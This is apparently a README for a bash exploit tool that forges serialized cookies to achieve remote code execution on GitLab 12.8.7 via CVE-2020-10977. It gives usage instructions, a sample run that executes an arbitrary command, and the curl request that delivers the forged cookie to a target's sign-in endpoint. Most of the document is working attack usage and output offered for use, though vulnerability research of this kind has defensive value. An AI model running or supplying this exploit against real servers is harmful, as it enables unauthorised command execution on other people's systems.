# Gitlab RCE 饼干生成;)

> GitLab 是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。
>
> GitLab是由GitLabInc.开发
>
> 使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能。使用Git作为代码管理工具，并在此基础上搭建起来的web服务。

# cookie_generater

- 攻击测试环境

```console
GitLab information
Version: 12.8.7-ee
Revision: 2643fd87200
```

- 脚本运行环境
  - macOS
  - Linux

- 构建环境
  - macOS

## 用法

```console
=======================================================================================================
    C(ollection) O(f) V(erified) V(ulnerabilities) : cookie_generater.sh in
    https://github.com/Bin4xin/bigger-than-bigger
    Author: bin4xin <bin4xin@sentrylab.cn>
    Bash scripts to generate cookies out of [gitlab-rails console].
    (RCE due to CVE-2020-10977 <local file read>) visit https://hackerone.com/reports/827052
     _     _                             _    _                      _     _
    | |__ (_) __ _  __ _  ___  _ _  ___ | |_ | |_   __ _  _ _   ___ | |__ (_) __ _  __ _  ___  _ _
    | '_ \| |/ _\ |/ _\ |/ -_)| '_||___||  _|| ' \ / _| || ' \ |___|| '_ \| |/ _\ |/ _\ |/ -_)| '_|
    |_.__/|_|\__, |\__, |\___||_|        \__||_||_|\__,_||_||_|     |_.__/|_|\__, |\__, |\___||_|
             |___/ |___/                                                     |___/ |___/
=======================================================================================================
    USAGE: bash cookie_generater.sh command [$command] [$url]
    SUCH AS: bash cookie_generater.sh [cmd|--cmd|-c] "touch /tmp/success" 8.8.8.8
    [help|--help|-h]: 	 	 print help message. 打印帮助信息
    [cmd|--cmd|-c]: 	 	 generate cookies mode. 生成COOKIE
    [$command]: 	 	 command you want to execute. 要执行的命令
    [$url]: 	 	 gitlab vuln url (unnecessary). gitlab地址，非必要
```

## 运行

```bash
root@4efe4aebffaa:/home# bash cookie_generater.sh cmd "touch /tmp/success" 192.168.2.127:8888

=======================================================================================================
    C(ollection) O(f) V(erified) V(ulnerabilities) : test.sh in
    https://github.com/Bin4xin/bigger-than-bigger
    Author: bin4xin <bin4xin@sentrylab.cn>
    Bash scripts to generate cookies out of [gitlab-rails console].
    (RCE due to CVE-2020-10977 <local file read>) visit https://hackerone.com/reports/827052
     _     _                             _    _                      _     _
    | |__ (_) __ _  __ _  ___  _ _  ___ | |_ | |_   __ _  _ _   ___ | |__ (_) __ _  __ _  ___  _ _
    | '_ \| |/ _\ |/ _\ |/ -_)| '_||___||  _|| ' \ / _| || ' \ |___|| '_ \| |/ _\ |/ _\ |/ -_)| '_|
    |_.__/|_|\__, |\__, |\___||_|        \__||_||_|\__,_||_||_|     |_.__/|_|\__, |\__, |\___||_|
             |___/ |___/                                                     |___/ |___/
=======================================================================================================
/opt/gitlab/bin/gitlab-rails
Detected [gitlab-rails] environments success.
[INFO] PLZ ensure(y/n/enter)
YOUR secret_key_base is [829fb*d54768c484*58417a3b]?
[INFO] PLZ ensure(y/n/enter)
 YOUR COMMAND: [touch /tmp/success]?
Ready to generate serializer cookies, it might take a while. PLEASE Patiently...
Generate Success! Enjoy!
exec command to ensure:
curl -k -vvv 'http://192.168.2.127:8888/users/sign_in' -b 'experimentation_subject_id={cookie}'
```

```bash
curl -k -vvv 'http://192.168.2.127:8888/users/sign_in' -b 'experimentation_subject_id={cookie}'
```